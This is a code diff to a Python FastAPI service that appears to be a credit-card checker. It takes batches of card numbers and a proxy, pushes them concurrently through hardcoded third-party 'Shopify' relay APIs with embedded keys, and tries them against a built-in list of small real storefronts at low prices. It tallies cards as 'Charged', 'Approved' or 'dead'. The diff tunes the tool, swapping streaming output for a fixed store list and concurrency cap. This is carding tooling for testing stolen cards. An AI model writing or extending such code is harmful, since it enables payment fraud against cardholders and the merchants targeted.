@@ -1,6 +1,5 @@
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import StreamingResponse
 import aiohttp
 import asyncio
 import os
@@ -15,110 +14,26 @@ SHOPIFY_APIS = {
     "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
 }
 
+DEFAULT_SITES = [
+    {"url": "https://that-girls-place-4.myshopify.com", "price": 4.99},
+    {"url": "https://aviation-museum-gift-shop.myshopify.com", "price": 6.53},
+    {"url": "https://fort4fitness.myshopify.com", "price": 6.9},
+    {"url": "https://little-things-vintage.myshopify.com", "price": 7.0},
+    {"url": "https://shopvivalafitness.myshopify.com", "price": 7.9},
+    {"url": "https://shopatrena.myshopify.com", "price": 8.88},
+    {"url": "https://921f3b-2.myshopify.com", "price": 9.9},
+    {"url": "https://luxxmedicalspa.myshopify.com", "price": 9.9},
+]
+
 @app.post("/check")
 async def check_cards(data: dict):
     cards = data.get("cards", [])
     proxy = data.get("proxy", "")
     api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
     concurrency = data.get("concurrency", 50)
-    sites = data.get("sites", [])
-    max_rounds = data.get("max_rounds", 10)
-    batch_size = data.get("batch_size", 100)
+    sites = data.get("sites", DEFAULT_SITES)[:8]
     
     api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
-    
-    if not sites:
-        sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
-    
-    # Take only 8 sites max
-    sites = sites[:8]
-    
-    async def generate():
-        queue = asyncio.Queue()
-        for card in cards:
-            queue.put_nowait(card)
-        
-        sem = asyncio.Semaphore(concurrency)
-        batch = []
-        checked = 0
-        charged = 0
-        approved = 0
-        dead = 0
-        
-        async def worker():
-            nonlocal checked, charged, approved, dead, batch
-            timeout = aiohttp.ClientTimeout(total=15)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                while not queue.empty():
-                    try:
-                        card = queue.get_nowait()
-                    except asyncio.QueueEmpty:
-                        break
-                    
-                    async with sem:
-                        result = await check_card_fast(session, api, card, sites, max_rounds)
-                        batch.append(result)
-                        checked += 1
-                        if result["status"] == "Charged":
-                            charged += 1
-                        elif result["status"] == "Approved":
-                            approved += 1
-                        elif result["status"] in ["Declined", "Expired"]:
-                            dead += 1
-                    
-                    queue.task_done()
-                    
-                    # Send batch every 100 cards
-                    if len(batch) >= batch_size:
-                        yield json.dumps({
-                            "type": "batch",
-                            "results": batch,
-                            "checked": checked,
-                            "charged": charged,
-                            "approved": approved,
-                            "dead": dead
-                        }) + "\n"
-                        batch = []
-        
-        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
-        await asyncio.gather(*workers)
-        
-        # Send remaining
-        if batch:
-            yield json.dumps({
-                "type": "batch",
-                "results": batch,
-                "checked": checked,
-                "charged": charged,
-                "approved": approved,
-                "dead": dead
-            }) + "\n"
-        
-        # Send final summary
-        yield json.dumps({
-            "type": "done",
-            "total": checked,
-            "charged": charged,
-            "approved": approved,
-            "dead": dead
-        }) + "\n"
-    
-    return StreamingResponse(generate(), media_type="application/x-ndjson")
-
-@app.post("/check_old")
-async def check_cards_old(data: dict):
-    """Old non-streaming endpoint for backward compatibility"""
-    cards = data.get("cards", [])
-    proxy = data.get("proxy", "")
-    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
-    concurrency = data.get("concurrency", 50)
-    sites = data.get("sites", [])
-    max_rounds = data.get("max_rounds", 10)
-    
-    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
-    if not sites:
-        sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
-    sites = sites[:8]
     
     results = []
     checked = 0
@@ -130,7 +45,7 @@ async def check_cards_old(data: dict):
     for card in cards:
         queue.put_nowait(card)
     
-    sem = asyncio.Semaphore(concurrency)
+    sem = asyncio.Semaphore(min(concurrency, 100))
     
     async def worker():
         nonlocal checked, charged, approved, dead
@@ -142,21 +57,28 @@ async def check_cards_old(data: dict):
                 except asyncio.QueueEmpty:
                     break
                 async with sem:
-                    result = await check_card_fast(session, api, card, sites, max_rounds)
+                    result = await check_card_fast(session, api, card, sites)
                     results.append(result)
                     checked += 1
                     if result["status"] == "Charged": charged += 1
                     elif result["status"] == "Approved": approved += 1
-                    elif result["status"] in ["Declined", "Expired"]: dead += 1
+                    else: dead += 1
                 queue.task_done()
     
     workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
     await asyncio.gather(*workers)
     
-    return {"results": results, "total": len(results), "checked": checked, "charged": charged, "approved": approved, "dead": dead}
+    return {
+        "results": results,
+        "total": len(results),
+        "checked": checked,
+        "charged": charged,
+        "approved": approved,
+        "dead": dead
+    }
 
-async def check_card_fast(session, api, card, sites, max_rounds=3):
-    for round_num in range(max_rounds):
+async def check_card_fast(session, api, card, sites):
+    for round_num in range(10):
         shuffled = list(sites)
         random.shuffle(shuffled)
         for site_obj in shuffled:
